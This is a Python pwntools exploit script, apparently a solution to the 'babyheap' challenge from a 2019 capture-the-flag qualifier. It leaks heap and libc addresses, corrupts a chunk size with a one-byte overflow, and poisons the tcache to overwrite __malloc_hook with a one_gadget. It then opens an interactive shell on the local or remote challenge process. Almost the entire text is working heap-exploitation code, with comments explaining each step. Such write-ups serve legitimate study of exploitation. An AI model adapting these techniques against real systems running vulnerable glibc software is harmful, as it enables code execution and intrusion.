from pwn import *
import sys

e = ELF("./babyheap")
libc = ELF("./libc.so.6")

p = None
if len(sys.argv) == 1:
  p = process("./babyheap", env={"LD_PRELOAD": "./libc.so.6"})
  #p = process(["/home/robert/linkers/libc29/lib/x86_64-linux-gnu/ld-2.29.so", "./babyheap"], env={"LD_LIBRARY_PATH": "."})
else:
  p = remote("babyheap.quals2019.oooverflow.io", 5000)

index = []
def alloc(big=False, payload="NILL"):
  global p, index

  idx = 0
  for i in range(0x10):
    if i not in index:
      idx = i
      break
  
  p.sendlineafter(">", "M")
  size = 0x178 if big else 0xf8 
  p.sendlineafter(">", str(size))

  tag = chr(ord("A") + idx)
  if payload != "NILL":
    p.sendlineafter(">", payload)
  else:
    p.sendlineafter(">", tag * 0x8)

  index.append(idx)
  return idx

def free(idx):
  global p, index

  index.remove(idx)

  p.sendlineafter(">", "F")
  p.sendlineafter(">", str(idx))

def show(idx):
  global p

  p.sendlineafter(">", "S")
  p.sendlineafter(">", str(idx))

heaps = []
for i in range(7):
  heaps.append(alloc())
A = alloc()
B = alloc()

old_heaps = heaps + [A, B]
old_heaps.reverse()

for i in heaps:
  free(i)
free(A)
free(B)

"""
Bins look like
Tcache (size 7) -> 6 -> 5 -> 4 -> 3 -> 2 -> 1 -> 0
Unsorted bins -> 7 -> 8

where the number refers to the #th alloc. 

Our index array is empty too.

We create this setup so we `free()` will initialize the pointers from which we can read. The `fd` pointers of the tcache chunks contain a heap address. The `bk` pointer of the first unsorted bin contains a libc address.
"""

# This is chunk 6, or the top of the tcache because tcache precedes fastbins
tcache_top = alloc(payload="")
show(tcache_top)
heap_base = -0x1000 & u64(p.recvline(keepends=False)[1:].ljust(8, "\x00"))
print("Heap Base: {:#x}".format(heap_base))

tcache_chunks = []
for i in range(6):
  tcache_chunks.append(alloc())
A = alloc(payload="A" * 8 + "A")

show(A)
libc_base = -0x1000 & u64(p.recvline(keepends=False)[9:].ljust(8, "\x00")) + 0x00007f95aa705000 - 0x7f95aa8e9000
print("Libc Base: {:#x}".format(libc_base))

"""
We need 3 chunks to set up our exploit. These chunks need to be continguous as well. The index array looks like [6, 5, 4, 3, 2, 1, 0, 7] and there is one chunk in the unsorted bin.

If we free indexes 0..2, tcache becomes -> 4 -> 5 -> 6 which creates the continguous chunks needed to setup our exploit.

"""
for i in range(3):
  free(i)

"""
Overwrite the next chunk's size header to make it a big enough to service a big chunk from alloc().

In order to readd it to the right tcache bin, we have to free it again, hence the free(alloc()).  
"""
A = alloc(payload="A" * 0xf8 + p64(0x80)[0])
free(alloc())


# Overwrite the fd pointer of C's tcache entry with __malloc_hook. 

print("Malloc Hook: {:#x}".format(libc_base + libc.symbols["__malloc_hook"]))
# Apparently there aren't any size / alignment checks here (in glibc 2.29)
B_f = alloc(big=True, payload=0xf8*"A" + "A" * 8 + p64(libc_base + libc.symbols["__malloc_hook"]).replace("\x00", ""))

# Returns C
alloc()
# Returns __malloc_hook. Then overwrite with one_gadget and win!
alloc(payload=p64(libc_base + 0x106ef8).replace("\x00", ""))

p.sendlineafter(">", "M")
p.sendlineafter(">", "1")

p.interactive()
